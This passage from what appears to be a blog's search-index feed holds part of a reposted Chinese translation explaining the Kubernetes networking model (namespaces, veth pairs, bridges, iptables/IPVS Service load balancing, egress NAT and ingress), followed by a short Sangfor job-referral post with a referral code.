src="https://mmbiz.qpic.cn/mmbiz_png/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgoTjJmceqShbEoZ6ibwMOA1VZOV2yYQmN6z9BovoSiafExusQt9dpyu0A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                                <strong>图2.root network namespace</strong></p><p>对于 Docker 而言，一个 Pod 会被构建成一组共享网络命名空间的 Docker 容器，Pod 中的容器都有相同的 IP 地址和端口空间，它们都是通过分配给 Pod 的网络命名空间来分配的，并且可以通过 localhost 访问彼此，因为它们位于同一个命名空间中。这是使用 Docker 作为 Pod 容器来实现的，它持有网络命名空间，而应用容器则通过 Docker 的 <code>-net=container:sandbox-container</code> 功能加入到该命名空间中，图3显示了每个 Pod 如何由共享网络命名空间内的多个 Docker 容器（<code>ctr*</code>）组成的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgx14N89bgPKjXwqTDV2ia9FbbLyLP2fGEvBrMUT5U4ibvq87nySmZ1xTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                               <strong>图3.每个 Pod 的网络命名空间</strong></p><p>此外 Pod 中的容器还可以访问共享卷，这些卷被定义为 Pod 的一部分，并且可以挂载到每个容器的文件系统中。</p><h2 id="Pod-到-Pod-网络"><a href="#Pod-到-Pod-网络" class="headerlink" title="Pod 到 Pod 网络"></a>Pod 到 Pod 网络</h2><p>在 Kubernetes 中，每个 Pod 都有一个真实的 IP 地址，每个 Pod 都使用该 IP 地址与其他 Pod 进行通信。接下来我们将来了解 Kubernetes 如何使用真实的 IP 来实现 Pod 与 Pod 之间的通信的。我们先来讨论同一节点上的 Pod 通信的方式。</p><p>从 Pod 的角度来看，它存在于自己的网络命名空间中，需要与同一节点上的其他网络命名空间进行通信。值得庆幸的时候，命名空间可以使用 Linux 虚拟以太网设备或由两个虚拟接口组成的 <code>veth</code> 对进行连接，这些虚拟接口可以分布在多个命名空间上。要连接 Pod 命名空间，我们可以将 veth 对的的一侧分配给 root network namespace，将另一侧分配给 Pod 的网络命名空间。每个 veth 对就像一根网线，连接两侧并允许流量在它们之间流动。这种设置可以复制到节点上的任意数量的 Pod。图4显示了连接虚拟机上每个 Pod 的 root network namespace 的 veth 对。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgiav7goAhdM2Fg40BpBNia6OmnP1yZJ0O2aD9ajK98r46EfkGxIfMYJzQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                                  <strong>图4.Pod 的 veth 对</strong></p><p>现在 Pod 都有自己的网络命名空间，这样它们就有自己的网络设备和 IP 地址，并且它们连接到节点的 root 命名空间，现在我们希望 Pod 能够通过 root 命名空间进行通信，那么我们将要使用一个网络 <em>bridge（网桥）</em>来实现。</p><p>Linux bridge 是用纯软件实现的虚拟交换机，有着和物理交换机相同的功能，例如二层交换，MAC 地址学习等。因此我们可以把 veth pair 等设备绑定到网桥上，就像是把设备连接到物理交换机上一样。bridge 的工作方式是通过检查通过它的数据包目的地，并决定是否将数据包传递给连接到网桥的其他网段，从而在源和目的地之间维护一个转发表。bridge 通过查看网络中每个以太网设备的唯一 MAC 地址来决定是桥接数据还是丢弃数据。</p><p>Bridges 实现了 ARP 协议来发现与指定 IP 地址关联的链路层 MAC 地址。当 bridge 接收到数据帧的时候，bridge 将该帧广播给所有连接的设备（原始发送者除外），响应该帧的设备被存储在一个查找表中，未来具有相同 IP 地址的通信使用查找表来发现正确的 MAC 地址来转发数据包。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgaC5x2L2NGESEDibAC2J9Y4cSics1zvr3vlQEubR88po8icKdIZnzVDGag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                          <strong>图5.使用桥接连接命名空间</strong></p><h3 id="同节点-Pod-通信"><a href="#同节点-Pod-通信" class="headerlink" title="同节点 Pod 通信"></a>同节点 Pod 通信</h3><p>网络命名空间将每个 Pod 隔离到自己的网络堆栈中，虚拟以太网设备将每个命名空间连接到根命名空间，以及一个将命名空间连接在一起的网桥，这样我们就准备好在同一节点上的 Pod 之间发送流量了，如下图6所示。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgbMZZruJE0xAuacLiaia0y3HtN4ic5QJWsCEEpHgfoWsQMboak31eaeXOg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                                   <strong>图6.同节点上的Pod间的数据包移动</strong></p><p>这上图中，pod1 向自己的网络设备 <code>eth0</code> 发送了一个数据包，对于 pod1 来说，<code>eth0</code> 通过虚拟网络设备连接到 root netns 的 <code>veth0(1)</code>，网桥 <code>cbr0</code> 被配置为与 <code>veth0</code> 一端相连，一旦数据包到达网桥，网桥就会使用 ARP 协议将数据包发送到 <code>veth1(3)</code>。当数据包到达虚拟设备 <code>veth1</code> 时，它被直接转发到 pod2 的命名空间内的 <code>eth0(4)</code> 设备。这整个过程中，每个 Pod 仅与 <code>localhost</code> 上的 <code>eth0</code> 进行通信，流量就会被路由到正确的 Pod。</p><p>Kubernetes 的网络模型决定了 Pod 必须可以通过其 IP 地址跨节点访问，也就是说，一个 Pod 的 IP 地址始终对网络中的其他 Pod 是可见的，每个 Pod 看待自己的 IP 地址的方式与其他 Pod 看待它的方式是相同的。接下来我们来看看不同节点上的 Pod 之间的流量路由问题。</p><h3 id="跨节点-Pod-通信"><a href="#跨节点-Pod-通信" class="headerlink" title="跨节点 Pod 通信"></a>跨节点 Pod 通信</h3><p>在研究了如何在同一节点上的 Pod 之间路由数据包之后，接下来我们来看下不同节点上的 Pod 之间的通信。Kubernetes 网络模型要求 Pod 的 IP 是可以通过网络访问的，但它并没有规定必须如何来实现。</p><p>通常集群中的每个节点都分配有一个 <code>CIDR</code>，用来指定该节点上运行的 Pod 可用的 IP 地址。一旦以 <code>CIDR</code> 为目的地的流量到达节点，节点就会将流量转发到正确的 Pod。图7展示了两个节点之间的网络通信，假设网络可以将 <code>CIDR</code> 中的流量转发到正确的节点。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgvHLovL3sZSEtEia3tKWIDCS43V6PLN4kxIjdLnMugfW32fl4ZfHmwSg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                                   <strong>图7.不同节点上的Pod间通信</strong></p><p>上图一样和图6相同的地方开始请求，但是这次目标 Pod（绿色标注）与源 Pod（蓝色标注）位于不同的节点上。数据包首先通过 pod1 的网络设备发送，该设备与 root netns（1）中的虚拟网络设备配对，最终数据包到达 root netns 的网桥（2）上。</p><p>这个时候网桥上的 ARP 会失败，因为与网桥相连的没有正确的数据包 MAC 地址。一旦失败，网桥会将数据包发送到默认路由上 - root netns 的 <code>eth0</code> 设备，此时就会路由离开节点，进入网络（3）。我们现在假设网络可以根据分配给节点的 <code>CIDR</code> 将数据包路由到正确的节点（4）。数据包进入目标节点的 root netns（VM2 上的 eth0），这那里它通过网桥路由到正确的虚拟设备（5）。最后，路由通过位于 pod4 的命名空间（6）中的虚拟设备 <code>eth0</code> 来完成。一般来说，每个节点都知道如何将数据包传递给其内部运行的 Pod，一旦数据包到达目标节点，数据包的流动方式与同一节点上的 Pod 间通信方式一样。</p><p>我们这里没有介绍如何配置网络来将 Pod IPs 的流量路由到负责这些 IP 的正确节点，这和特定的网络有关系，比如 AWS 就维护了一个 Kubernetes 容器网络插件，该插件允许在 AWS 的 VPC 环境中使用 [容器网络接口（<code>CNI</code>）插件]（<a href="https://github.com/aws/amazon-vpc-cni-k8s%EF%BC%89%E6%9D%A5%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%88%B0%E8%8A%82%E7%82%B9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82">https://github.com/aws/amazon-vpc-cni-k8s）来进行节点到节点的网络通信。</a></p><p>在 EC2 中，每个实例都绑定到一个弹性网络接口 (ENI)，并且所有 ENI 都连接在一个 VPC 内 —— ENI 无需额外操作即可相互访问。默认情况下，每个 EC2 实例部署一个 ENI，但你可以创建多个 ENI 并将它们部署到 EC2 实例上。Kubernetes 的 AWS CNI 插件会为节点上的每个 Pod 创建一个新的 ENI，因为 VPC 中的 ENI 已经连接到了现有 AWS 基础设施中，这使得每个 Pod 的 IP 地址可以在 VPC 内自然寻址。当 CNI 插件被部署到集群时，每个节点（EC2 实例）都会创建多个弹性网络接口，并为这些实例分配 IP 地址，从而为每个节点形成了一个 <code>CIDR</code> 块。当部署 Pod 时，有一个小的二进制文件会作为 DaemonSet 部署到 Kubernetes 集群中，从节点本地的 <code>kubelet</code> 进程接收任何添加 Pod 到网络的请求，这个二进制文件会从节点的可用 ENI 池中挑选一个可用的 IP 地址，并通过在 Linux 内核中连接虚拟网络设备和网桥将其分配给 Pod，和在同一节点内容的 Pod 通信一样，有了这个，Pod 的流量就可以跨集群内的节点进行通信了。</p><h2 id="Pod-到-Service"><a href="#Pod-到-Service" class="headerlink" title="Pod 到 Service"></a>Pod 到 Service</h2><p>上面我们已经介绍了如何在 Pod 和它们相关的 IP 地址之间的通信。但是 Pod 的 IP 地址并不是固定不变的，会随着应用的扩缩容、应用崩溃或节点重启而出现或消失，这些都可能导致 Pod IP 地址发生变化，Kubernetes 中可以通过 <em>Service</em> 对象来解决这个问题。</p><p>Kubernetes Service 管理一组 Pod，允许你跟踪一组随时间动态变化的 Pod IP 地址，Service 作为对 Pod 的抽象，为一组 Pod 分配一个虚拟的 VIP 地址，任何发往 Service VIP 的流量都会被路由到与其关联的一组 Pod。这就允许与 Service 相关的 Pod 集可以随时变更 - 客户端只需要知道 Service VIP 即可。</p><p>创建 Service 时候，会创建一个新的虚拟 IP（也称为 clusterIP），这集群中的任何地方，发往虚拟 IP 的流量都将负载均衡到与 Service 关联的一组 Pod。实际上，Kubernetes 会自动创建并维护一个分布式集群内的负载均衡器，将流量分配到 Service 相关联的健康 Pod 上。接下来让我们仔细看看它是如何工作的。</p><h3 id="netfilter-与-iptables"><a href="#netfilter-与-iptables" class="headerlink" title="netfilter 与 iptables"></a>netfilter 与 iptables</h3><p>为了在集群中执行负载均衡，Kubernetes 会依赖于 Linux 内置的网络框架 - <code>netfilter</code>。Netfilter 是 Linux 提供的一个框架，它允许以自定义处理程序的形式实现各种与网络相关的操作，Netfilter 为数据包过滤、网络地址转换和端口转换提供了各种功能和操作，它们提供了引导数据包通过网络所需的功能，以及提供禁止数据包到达计算机网络中敏感位置的能力。</p><p><code>iptables</code> 是一个用户空间程序，它提供了一个基于 table 的系统，用于定义使用 netfilter 框架操作和转换数据包的规则。在 Kubernetes 中，iptables 规则由 kube-proxy 控制器配置，该控制器会 watch kube-apiserver 的变更，当对 Service 或 Pod 的变化更新了 Service 的虚拟 IP 地址或 Pod 的 IP 地址时，iptables 规则会被自动更新，以便正确地将指向 Service 的流量路由到支持 Pod。iptables 规则会监听发往 Service VIP 的流量，并且在匹配时，从可用 Pod 集中选择一个随机 Pod IP 地址，并且 iptables 规则将数据包的目标 IP 地址从 Service 的 VIP 更改为所选的 Pod IP。当 Pod 启动或关闭时，iptables 规则集也会更新以反映集群的变化状态。换句话说，iptables 已经在节点上做了负载均衡，以将指向 Service VIP 的流量路由到实际的 Pod 的 IP 上。</p><p>在返回路径上，IP 地址来自目标 Pod，在这种情况下，iptables 再次重写 IP 头以将 Pod IP 替换为 Service 的 IP，以便 Pod 认为它一直只与 Service 的 IP 通信。</p><h3 id="IPVS"><a href="#IPVS" class="headerlink" title="IPVS"></a>IPVS</h3><p>Kubernetes 新版本已经提供了另外一个用于集群负载均衡的选项：IPVS， IPVS 也是构建在 netfilter 之上的，并作为 Linux 内核的一部分实现了传输层的负载均衡。IPVS 被合并到了 LVS（Linux 虚拟服务器）中，它在主机上运行并充当真实服务器集群前面的负载均衡器，IPVS 可以将基于 TCP 和 UDP 的服务请求定向到真实服务器，并使真实服务器的服务作为虚拟服务出现在一个 IP 地址上。这使得 IPVS 非常适合 Kubernetes 服务。</p><p>这部署 kube-proxy 时，可以指定使用 iptables 或 IPVS 来实现集群内的负载均衡。IPVS 专为负载均衡而设计，并使用更高效的数据结构（哈希表），与 iptables  相比允许更大的规模。在使用 IPVS 模式的 Service 时，会发生三件事：在 Node 节点上创建一个虚拟 IPVS 接口，将 Service 的 VIP 地址绑定到虚拟 IPVS 接口，并为每个 Service VIP 地址创建 IPVS 服务器。</p><h3 id="Pod-到-Service-通信"><a href="#Pod-到-Service-通信" class="headerlink" title="Pod 到 Service 通信"></a>Pod 到 Service 通信</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgO80nIibbUc6npiblqjuW8RAqlU6MhtBDUSRCwf4D1K81Wc9jdzwhnr8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                                     <strong>图8. Pod 与 Service 之间通信</strong></p><p>当这 Pod 和 Service 之间路由一个数据包时，流量和以前开始的方式一样，数据包首先通过连接到 Pod 的网络命名空间（1）的 <code>eth0</code> 离开 Pod，。然后它通过虚拟网络设备到达网桥（2）。网桥上运行的 ARP 是不知道 Service 地址的，所以它通过默认路由 <code>eth0</code>（3）将数据包传输出去。到这里会有一些不同的地方了，在 <code>eth0</code> 接收之前，该数据包会被 iptables 过滤，在收到数据包后，iptables 使用 kube-proxy 在节点上安装的规则来响应 Service 或 Pod 事件，将数据包的目的地从 Service VIP 改写为特定的 Pod IP（4）。该数据包现在就要到达 pod4 了，而不是 Service 的 VIP，iptables 利用内核的 <code>conntrack</code> 工具来记录选择的 Pod，以便将来的流量会被路由到相同的 Pod。从本质上讲，iptables 直接从节点上完成了集群内的负载均衡，然后流量流向 Pod，剩下的就和前面的 Pod 到 Pod 通信一样的了（5）。</p><h3 id="Service-到-Pod-通信"><a href="#Service-到-Pod-通信" class="headerlink" title="Service 到 Pod 通信"></a>Service 到 Pod 通信</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgtV3KndqR2yoKUjoRlicMAwVOAnRzQn1lzibNE7ndyQpNHQ3UoeF0toiag/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                                              <strong>图9.在 Service 和 Pod 之间通信</strong></p><p>相应的回包的时候，收到该数据包的 Pod 将响应，将源 IP 标记为自己的 IP，将目标 IP 标记为最初发送数据包的 Pod(1)。进入节点后，数据包流经 iptables，它使用 <code>conntrack</code> 记住它之前所做的选择，并将数据包的源重写为 Service 的 VIP 而不是现在 Pod 的 IP(2)。从这里开始，数据包通过网桥流向与 Pod 的命名空间配对的虚拟网络设备 (3)，然后流向我们之前看到的 Pod 的虚拟网络设备 (4)。</p><h2 id="外网到-Service-通信"><a href="#外网到-Service-通信" class="headerlink" title="外网到 Service 通信"></a>外网到 Service 通信</h2><p>到这里我们已经了解了 Kubernetes 集群内的流量是如何路由的，但是更多的时候我们需要将服务暴露到外部去。这个时候会涉及到两个主要的问题：</p><ul><li>将流量从 Kubernetes 服务路由到互联网上去</li><li>将流量从互联网传到你的 Kubernetes 服务</li></ul><p>接下来我们就来讨论这些问题。</p><h3 id="出流量"><a href="#出流量" class="headerlink" title="出流量"></a>出流量</h3><p>从节点到公共 Internet 的路由流量也是和特定的网络有关系的，这取决于你的网络如何配置来发布流量的。这里我们以 AWS VPC 为例来进行说明。</p><p>在 AWS 中，Kubernetes 集群在 VPC 中运行，每个节点都分配有一个私有 IP 地址，该地址可从 Kubernetes 集群内访问。要从集群外部访问服务，你可以在 VPC 上附加一个外网网关。外网网关有两个用途：在你的 VPC 路由表中为可路由到外网的流量提供目标，以及为已分配公共 IP 地址的实例执行网络地址转换 (NAT)。NAT 转换负责将集群节点的内部 IP 地址更改为公网中可用的外部 IP 地址。</p><p>有了外网网关，VM 就可以自由地将流量路由到外网。不过有一个小问题，Pod 有自己的 IP 地址，与运行 Pod 的节点 IP 地址不同，并且外网网关的 NAT 转换仅适用于 VM IP 地址，因为它不知道哪些 Pod 在哪些 VM 上运行 —— 网关不支持容器。让我们看看 Kubernetes 是如何使用 iptables 来解决这个问题的。</p><p>在下图中，数据包源自 Pod 的命名空间 (1)，并经过连接到根命名空间 (2) 的 veth 对。一旦进入根命名空间，数据包就会从网桥移动到默认设备，因为数据包上的 IP 与连接到网桥的任何网段都不匹配。在到达根命名空间的网络设备 (3) 之前，iptables 会破坏数据包 (3)。在这种情况下，数据包的源 IP 地址是 Pod，如果我们将源保留为 Pod，外网网关将拒绝它，因为网关 NAT 只了解连接到 VM 的 IP 地址。解决方案是<strong>让 iptables 执行源 NAT</strong> —— 更改数据包源，使数据包看起来来自 VM 而不是 Pod。有了正确的源 IP，数据包现在可以离开 VM (4) 并到达外网网关 (5) 了。外网网关将执行另一个 NAT，将源 IP 从 VM 内部 IP 重写为公网IP。最后，数据包将到达互联网上 (6)。在返回的路上，数据包遵循相同的路径，并且任何源 IP 的修改都会被取消，这样系统的每一层都会接收到它理解的 IP 地址：节点或 VM 级别的 VM 内部，以及 Pod 内的 Pod IP命名空间。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgGaUDVlu2VesbE999GjqtA1WthWLBRF47ZDQ6XttQMqkjq9fc1YE3kg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                                       <strong>图10.从Pod到互联网通信</strong></p><h3 id="入流量"><a href="#入流量" class="headerlink" title="入流量"></a>入流量</h3><p>让流量进入你的集群是一个非常难以解决的问题。同样这也和特定的网络环境有关系，但是一般来说入流量可以分为两种解决方案：</p><ul><li>Service LoadBalancer</li><li>Ingress 控制器</li></ul><p><strong>LoadBalancer</strong></p><p>当你创建一个 Kubernetes Service时，你可以选择指定一个 LoadBalancer 来使用它。LoadBalancer 有为你提供服务的云供应商负责创建负载均衡器，创建服务后，它将暴露负载均衡器的 IP 地址。终端用户可以直接通过该 IP 地址与你的服务进行通信。</p><p><strong>LoadBalancer 到 Service</strong></p><p>在部署了 Service 后，你使用的云提供商将会为你创建一个新的 LoadBalancer（1）。因为 LoadBalancer 不支持容器，所以一旦流量到达 LoadBalancer，它就会分布在集群的各个节点上（2）。每个节点上的 iptables 规则会将来自 LoadBalancer 的传入流量路由到正确的 Pod 上（3）。从 Pod 到客户端的响应将返回 Pod 的 IP，但客户端需要有 LoadBalancer 的 IP 地址。正如我们之前看到的，iptables 和 conntrack 被用来在返回路径上正确重写 IP 地址。</p><p>下图展示的就是托管 Pod 的三个节点前面的负载均衡器。传入流量（1）指向 Service 的 LoadBalancer，一旦 LoadBalancer 接收到数据包（2），它就会随机选择一个节点。我们这里的示例中，我们选择了没有运行 Pod 的节点 VM2（3）。在这里，运行在节点上的 iptables 规则将使用 kube-proxy 安装到集群中的内部负载均衡规则，将数据包转发到正确的 Pod。iptables 执行正确的 NAT 并将数据包转发到正确的 Pod（4）。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgjicHYRZia3uYzyTenTbsnsCcUaKZYt1PeIj69MYh8uNic3oziaicIZeFKmQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                      <strong>图11.外网访问 Service</strong></p><p><strong>Ingress 控制器</strong></p><p>在七层网络上 Ingress 在 HTTP&#x2F;HTTPS 协议范围内运行，并建立在 Service 之上。启用 Ingress 的第一步是使用 Kubernetes 中的 NodePort 类型的 Service，如果你将 Service 设置成 NodePort 类型，Kubernetes master 将从你指定的范围内分配一个端口，并且每个节点都会将该端口代理到你的 Service，也就是说，任何指向节点端口的流量都将使用 iptables 规则转发到 Service。</p><p>将节点的端口暴露在外网，可以使用一个 Ingress 对象，Ingress 是一个更高级别的 HTTP 负载均衡器，它将 HTTP 请求映射到 Kubernetes Service。根据控制器的实现方式，Ingress 的使用方式会有所不同。HTTP 负载均衡器，和四层网络负载均衡器一样，只了解节点 IP（而不是 Pod IP），因此流量路由同样利用由 kube-proxy 安装在每个节点上的 iptables 规则提供的内部负载均衡。</p><p>在 AWS 环境中，ALB Ingress 控制器使用 AWS 的七层应用程序负载均衡器提供 Kubernetes 入口。下图详细介绍了此控制器创建的 AWS 组件，它还演示了 Ingress 流量从 ALB 到 Kubernetes 集群的路由。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgdr38KkXPhd9AKtGnrYhn2SxGDKy0fbjFWIrfrgzXaXCzjicEIjrWzRg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                                   <strong>图12.Ingress 控制器</strong></p><p>创建后，(1) Ingress Controller 会 watch 来自 Kubernetes APIServer 的 Ingress 事件。当它找到满足其要求的 Ingress 资源时，它会开始创建 AWS 资源。AWS 将 Application Load Balancer (ALB) (2) 用于 Ingress 资源。负载均衡器与用于将请求路由到一个或多个注册节点的 TargetGroup一起工作。(3) 在 AWS 中为 Ingress 资源描述的每个唯一 Kubernetes Service 创建 TargetGroup。(4) Listener 是一个 ALB 进程，它使用你配置的协议和端口检查连接请求。Listener 由 Ingress 控制器为你的 Ingress 资源中描述的每个端口创建。最后，为 Ingress 资源中指定的每个路径创建 TargetGroup 规则。这可以保证到特定路径的流量被路由到正确的 Kubernetes 服务上 (5)。</p><p><strong>Ingress 到 Service</strong></p><p>流经 Ingress 的数据包的生命周期与 LoadBalancer 的生命周期非常相似。主要区别在于 Ingress 知道 URL 的路径（可以根据路径将流量路由到 Service）Ingress 和节点之间的初始连接是通过节点上为每个服务暴露的端口。</p><p>部署 Service 后，你使用的云提供商将为你创建一个新的 Ingress 负载均衡器 (1)。因为负载均衡器不支持容器，一旦流量到达负载均衡器，它就会通过为你的服务端口分布在组成集群 (2) 的整个节点中。每个节点上的 iptables 规则会将来自负载均衡器的传入流量路由到正确的 Pod (3)。Pod 到客户端的响应将返回 Pod 的 IP，但客户端需要有负载均衡器的 IP 地址。正如我们之前看到的，iptables 和 conntrack 用于在返回路径上正确重写 IP。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgB6f7ZsmsiamnMF10mxPp1NvlmMw5sHGfqAQ0MKnkYTxlMKpjkI6Gctg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1" alt="图片"></p><p>​                                                                                                                                               <strong>图13.从 Ingress 到 Service</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了 Kubernetes 网络模型以及如何实现常见网络任务。网络知识点既广泛又很深，所以我们这里不可能涵盖所有的内容，但是你可以以本文为起点，然后去深入了解你感兴趣的主题。</p><blockquote><p>原文链接：<a href="https://sookocheff.com/post/kubernetes/understanding-kubernetes-networking-model">https://sookocheff.com/post/kubernetes/understanding-kubernetes-networking-model</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kubernetes</tag>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深信服内推</title>
    <link href="/2022/08/27/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%86%85%E6%8E%A8/"/>
    <url>/2022/08/27/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%86%85%E6%8E%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="帮忙社招、校招、实习内推，可帮忙查询最新进展、面试结果-简历优先处理、可以帮忙看简历以及回答力所能及的问题，欢迎大家来投，想要帮忙看简历或者问问题可以私聊加微信或者发送邮箱，由于内推岗位选择数量有限制，存在部分岗位没有显示，可以私聊我直接投递或者上官网公众号投递。"><a href="#帮忙社招、校招、实习内推，可帮忙查询最新进展、面试结果-简历优先处理、可以帮忙看简历以及回答力所能及的问题，欢迎大家来投，想要帮忙看简历或者问问题可以私聊加微信或者发送邮箱，由于内推岗位选择数量有限制，存在部分岗位没有显示，可以私聊我直接投递或者上官网公众号投递。" class="headerlink" title="帮忙社招、校招、实习内推，可帮忙查询最新进展、面试结果 - 简历优先处理、可以帮忙看简历以及回答力所能及的问题，欢迎大家来投，想要帮忙看简历或者问问题可以私聊加微信或者发送邮箱，由于内推岗位选择数量有限制，存在部分岗位没有显示，可以私聊我直接投递或者上官网公众号投递。"></a>帮忙社招、校招、实习内推，可帮忙查询最新进展、面试结果 - 简历优先处理、可以帮忙看简历以及回答力所能及的问题，欢迎大家来投，想要帮忙看简历或者问问题可以私聊加微信或者发送邮箱，由于内推岗位选择数量有限制，存在部分岗位没有显示，可以私聊我直接投递或者上官网公众号投递。</h3><h3 id="招聘网址-https-app-mokahr-com-recommendation-apply-sangfor-5369-recommendCode-NTAEMbl-jobs-isCampusJob-1-amp-commitment-E5-85-A8-E8-81-8C"><a href="#招聘网址-https-app-mokahr-com-recommendation-apply-sangfor-5369-recommendCode-NTAEMbl-jobs-isCampusJob-1-amp-commitment-E5-85-A8-E8-81-8C" class="headerlink" title="招聘网址:   https://app.mokahr.com/recommendation-apply/sangfor/5369?recommendCode=NTAEMbl#/jobs?isCampusJob=1&amp;commitment=%E5%85%A8%E8%81%8C"></a>招聘网址:   <a href="https://app.mokahr.com/recommendation-apply/sangfor/5369?recommendCode=NTAEMbl#/jobs?isCampusJob=1&amp;commitment=%E5%85%A8%E8%81%8C">https://app.mokahr.com/recommendation-apply/sangfor/5369?recommendCode=NTAEMbl#/jobs?isCampusJob=1&amp;commitment=%E5%85%A8%E8%81%8C</a></h3><h3 id="内推码：NTAEMbl-投递时直接官网投递时填内推码即可，后续进展等问题可直接私信我！"><a href="#内推码：NTAEMbl-投递时直接官网投递时填内推码即可，后续进展等问题可直接私信我！" class="headerlink" title="内推码：NTAEMbl   投递时直接官网投递时填内推码即可，后续进展等问题可直接私信我！"></a>内推码：NTAEMbl   投递时直接官网投递时填内推码即可，后续进展等问题可直接私信我！</h3><p><img src="https://s2.loli.net/2022/08/27/aR4mNMEGDWwsHfT.jpg" alt="a3a7bad9b480bd23d69abd81723f366.jpg"></p>]]></content>
    
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>内推</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
